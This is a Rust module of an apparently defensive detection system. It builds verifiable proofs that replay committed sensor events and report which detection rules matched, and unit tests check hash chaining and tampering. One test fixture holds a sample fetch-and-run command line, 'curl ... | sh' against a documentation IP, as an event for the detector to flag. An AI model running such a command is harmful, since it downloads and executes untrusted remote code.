/// What the proof program runs: it replays a run of sealed windows and says which rules fired.
/// The agent runs the same function natively to know what the proof will say.
use borsh::{BorshDeserialize, BorshSerialize};
use zedr_ledger::{leaf, state_commitment, Hash, WindowHeader, GENESIS};
use zedr_protocol::SensorEvent;

use crate::{Match, State};

pub const JOURNAL_VERSION: u8 = 1;

/// One committed event as the prover holds it: the blind of its leaf and its canonical bytes
#[derive(Debug, Clone, PartialEq, Eq, BorshSerialize, BorshDeserialize)]
pub struct Committed {
    pub blind: Hash,
    pub event: Vec<u8>,
}

/// One sealed window as the prover holds it
#[derive(Debug, Clone, PartialEq, Eq, BorshSerialize, BorshDeserialize)]
pub struct WindowInput {
    pub window: u64,
    pub first_index: u64,
    pub gap: bool,
    pub events: Vec<Committed>,
}

/// Private input of one proof: consecutive windows of one epoch and the rule state they start from
#[derive(Debug, Clone, PartialEq, Eq, BorshSerialize, BorshDeserialize)]
pub struct Input {
    pub agent: Hash,
    pub epoch: u64,
    /// The first window opens the epoch, so the rules start with nothing remembered
    pub fresh: bool,
    pub head_in: Hash,
    pub state: State,
    pub salt_in: Hash,
    pub salt_out: Hash,
    pub windows: Vec<WindowInput>,
}

/// Public output of one proof
#[derive(Debug, Clone, PartialEq, Eq, BorshSerialize, BorshDeserialize)]
pub struct Journal {
    pub version: u8,
    pub agent: Hash,
    pub epoch: u64,
    pub first_window: u64,
    pub last_window: u64,
    pub first_index: u64,
    pub next_index: u64,
    pub fresh: bool,
    /// Head before the first window and head after the last, which pin every window between them
    pub head_in: Hash,
    pub head_out: Hash,
    /// Commitment to the rule state before and after, all zero before a fresh epoch
    pub state_in: Hash,
    pub state_out: Hash,
    pub matches: Vec<Match>,
}

impl Journal {
    pub fn to_bytes(&self) -> Vec<u8> {
        borsh::to_vec(self).expect("a journal always encodes")
    }

    pub fn from_bytes(bytes: &[u8]) -> Result<Self, String> {
        borsh::from_slice(bytes).map_err(|e| format!("Not a canonical journal: {}", e))
    }
}

impl Input {
    pub fn to_bytes(&self) -> Vec<u8> {
        borsh::to_vec(self).expect("a proof input always encodes")
    }

    pub fn from_bytes(bytes: &[u8]) -> Result<Self, String> {
        borsh::from_slice(bytes).map_err(|e| format!("Not a canonical proof input: {}", e))
    }
}

/// Replays the windows and returns the journal with the rule state they leave behind
pub fn run(input: Input) -> Result<(Journal, State), String> {
    let first = input.windows.first().ok_or_else(|| "A proof covers at least one window".to_string())?;
    let (first_window, first_index) = (first.window, first.first_index);

    let mut state = input.state;
    let state_in = if input.fresh {
        if state != State::default() {
            return Err("A fresh epoch starts from an empty rule state".to_string());
        }
        GENESIS
    } else {
        state_commitment(&input.salt_in, &state.to_bytes())
    };

    let mut head = input.head_in;
    let mut next_window = first_window;
    let mut next_index = first_index;
    let mut matches = Vec::new();
    for (position, window) in input.windows.iter().enumerate() {
        if window.window != next_window {
            return Err(format!("Window {} follows window {}", window.window, next_window.wrapping_sub(1)));
        }
        if window.first_index != next_index {
            return Err(format!("Window {} starts at event {} and the one before ended at {}", window.window, window.first_index, next_index));
        }

        let mut leaves = Vec::with_capacity(window.events.len());
        for committed in &window.events {
            leaves.push(leaf(&input.agent, input.epoch, next_index, &committed.blind, &committed.event));
            let event = SensorEvent::from_bytes(&committed.event)?;
            matches.extend(state.observe(next_index, &event));
            next_index = next_index.checked_add(1).ok_or_else(|| "The event index overflowed".to_string())?;
        }

        let header = WindowHeader::seal(&input.agent, input.epoch, window.window, window.first_index, input.fresh && position == 0, window.gap, head, &leaves)?;
        head = header.head;
        next_window = next_window.checked_add(1).ok_or_else(|| "The window number overflowed".to_string())?;
    }

    let journal = Journal {
        version: JOURNAL_VERSION,
        agent: input.agent,
        epoch: input.epoch,
        first_window,
        last_window: next_window - 1,
        first_index,
        next_index,
        fresh: input.fresh,
        head_in: input.head_in,
        head_out: head,
        state_in,
        state_out: state_commitment(&input.salt_out, &state.to_bytes()),
        matches,
    };
    Ok((journal, state))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::RuleId;
    use zedr_protocol::{ProcessAction, ProcessEvent};

    const AGENT: Hash = [5u8; 32];
    const EPOCH: u64 = 3;

    fn process(timestamp: u64, pid: u32, ppid: u32, path: &str, args: &[&str]) -> SensorEvent {
        let mut command_line = vec![path.to_string()];
        command_line.extend(args.iter().map(|arg| arg.to_string()));
        SensorEvent::Process(ProcessEvent {
            timestamp,
            pid,
            ppid,
            executable_path: path.to_string(),
            command_line,
            action: ProcessAction::Create,
            uid: 0,
            hash: None,
        })
    }

    fn committed(index: u64, event: &SensorEvent) -> Committed {
        Committed { blind: [index as u8; 32], event: event.to_bytes() }
    }

    fn window(window: u64, first_index: u64, events: &[SensorEvent]) -> WindowInput {
        WindowInput {
            window,
            first_index,
            gap: false,
            events: events.iter().enumerate().map(|(offset, event)| committed(first_index + offset as u64, event)).collect(),
        }
    }

    fn story() -> Vec<SensorEvent> {
        vec![
            process(1, 20, 0, "/usr/sbin/nginx", &[]),
            process(2, 21, 20, "/bin/sh", &["-c", "id"]),
            process(3, 22, 0, "/usr/bin/sleep", &["60"]),
            process(4, 23, 21, "/bin/sh", &["-c", "curl -s http://203.0.113.9/a | sh"]),
        ]
    }

    fn fresh_input(windows: Vec<WindowInput>) -> Input {
        Input { agent: AGENT, epoch: EPOCH, fresh: true, head_in: GENESIS, state: State::default(), salt_in: [0u8; 32], salt_out: [8u8; 32], windows }
    }

    #[test]
    fn test_the_journal_carries_the_heads_an_honest_server_already_holds() {
        let events = story();
        let (journal, _) = run(fresh_input(vec![window(0, 0, &events[..2]), window(1, 2, &events[2..])])).unwrap();

        let leaves: Vec<Hash> =
            events.iter().enumerate().map(|(index, event)| leaf(&AGENT, EPOCH, index as u64, &[index as u8; 32], &event.to_bytes())).collect();
        let first = WindowHeader::seal(&AGENT, EPOCH, 0, 0, true, false, GENESIS, &leaves[..2]).unwrap();
        let second = WindowHeader::seal(&AGENT, EPOCH, 1, 2, false, false, first.head, &leaves[2..]).unwrap();
        assert_eq!(journal.head_in, GENESIS);
        assert_eq!(journal.head_out, second.head);
        assert_eq!((journal.first_window, journal.last_window, journal.first_index, journal.next_index), (0, 1, 0, 4));
        assert_eq!(journal.state_in, GENESIS);
        assert_eq!(
            journal.matches,
            vec![
                Match { trigger: 1, rule: RuleId::ServerChild, context: vec![0], pid: 21, started_at: 2 },
                Match { trigger: 3, rule: RuleId::FetchAndRun, context: vec![1], pid: 23, started_at: 4 },
            ]
        );
        assert_eq!(Journal::from_bytes(&journal.to_bytes()).unwrap(), journal);
    }

    #[test]
    fn test_proving_in_two_runs_says_the_same_as_proving_in_one() {
        let events = story();
        let (whole, final_state) = run(fresh_input(vec![window(0, 0, &events[..2]), window(1, 2, &events[2..3]), window(2, 3, &events[3..])])).unwrap();

        let mut first_input = fresh_input(vec![window(0, 0, &events[..2])]);
        first_input.salt_out = [6u8; 32];
        let (first, state) = run(first_input).unwrap();
        let second_input = Input {
            agent: AGENT,
            epoch: EPOCH,
            fresh: false,
            head_in: first.head_out,
            state,
            salt_in: [6u8; 32],
            salt_out: [8u8; 32],
            windows: vec![window(1, 2, &events[2..3]), window(2, 3, &events[3..])],
        };
        let (second, state) = run(second_input).unwrap();

        assert_eq!(second.state_in, first.state_out, "the second proof starts from the state the first one left");
        assert_eq!(second.head_out, whole.head_out);
        assert_eq!(second.state_out, whole.state_out);
        assert_eq!(state, final_state);
        assert_eq!([first.matches, second.matches].concat(), whole.matches);
    }

    #[test]
    fn test_a_fresh_epoch_cannot_start_from_a_prepared_state() {
        let events = story();
        let mut prepared = State::default();
        prepared.observe(0, &events[3]);
        let mut input = fresh_input(vec![window(0, 0, &events)]);
        input.state = prepared;
        assert!(run(input).unwrap_err().contains("empty rule state"));
    }

    #[test]
    fn test_a_state_other_than_the_committed_one_shows_in_the_journal() {
        let events = story();
        let (first, state) = run(fresh_input(vec![window(0, 0, &events[..2])])).unwrap();
        let honest = Input {
            agent: AGENT,
            epoch: EPOCH,
            fresh: false,
            head_in: first.head_out,
            state,
            salt_in: [8u8; 32],
            salt_out: [9u8; 32],
            windows: vec![window(1, 2, &events[2..])],
        };
        let (journal, _) = run(honest.clone()).unwrap();
        assert_eq!(journal.state_in, first.state_out);
        assert_eq!(journal.matches.len(), 1);

        let forgetful = Input { state: State::default(), ..honest };
        let (journal, _) = run(forgetful).unwrap();
        assert_ne!(journal.state_in, first.state_out, "a server that chains the commitments refuses this proof");
    }

    #[test]
    fn test_windows_must_follow_each_other_without_a_hole() {
        let events = story();
        assert!(run(fresh_input(Vec::new())).is_err());
        assert!(run(fresh_input(vec![window(0, 0, &events[..2]), window(2, 2, &events[2..])])).unwrap_err().contains("follows"));
        assert!(run(fresh_input(vec![window(0, 0, &events[..2]), window(1, 3, &events[2..])])).unwrap_err().contains("starts at"));
    }

    #[test]
    fn test_any_change_to_a_committed_event_changes_the_head() {
        let events = story();
        let honest = fresh_input(vec![window(0, 0, &events)]);
        let (journal, _) = run(honest.clone()).unwrap();

        let mut swapped = honest.clone();
        swapped.windows[0].events[2] = committed(2, &process(3, 22, 0, "/usr/bin/sleep", &["61"]));
        assert_ne!(run(swapped).unwrap().0.head_out, journal.head_out);

        let mut dropped = honest.clone();
        dropped.windows[0].events.pop();
        let (short, _) = run(dropped).unwrap();
        assert_ne!(short.head_out, journal.head_out);
        assert_eq!(short.matches.len(), 1, "the dropped event was the second match, and the head no longer matches the server's");

        let mut flagged = honest.clone();
        flagged.windows[0].gap = true;
        assert_ne!(run(flagged).unwrap().0.head_out, journal.head_out);

        let mut other_agent = honest;
        other_agent.agent = [6u8; 32];
        assert_ne!(run(other_agent).unwrap().0.head_out, journal.head_out);
    }

    #[test]
    fn test_bytes_that_are_not_a_sensor_event_cannot_be_proven() {
        let mut input = fresh_input(vec![window(0, 0, &story())]);
        input.windows[0].events[1].event = vec![0xff, 0x01, 0x02];
        assert!(run(input).unwrap_err().contains("canonical sensor event"));
    }

    #[test]
    fn test_an_empty_window_proves_and_moves_the_chain() {
        let (journal, state) = run(fresh_input(vec![window(4, 90, &[]), window(5, 90, &[])])).unwrap();
        assert_eq!((journal.first_index, journal.next_index), (90, 90));
        assert!(journal.matches.is_empty());
        assert_ne!(journal.head_out, journal.head_in);
        assert_eq!(state, State::default());
    }
}
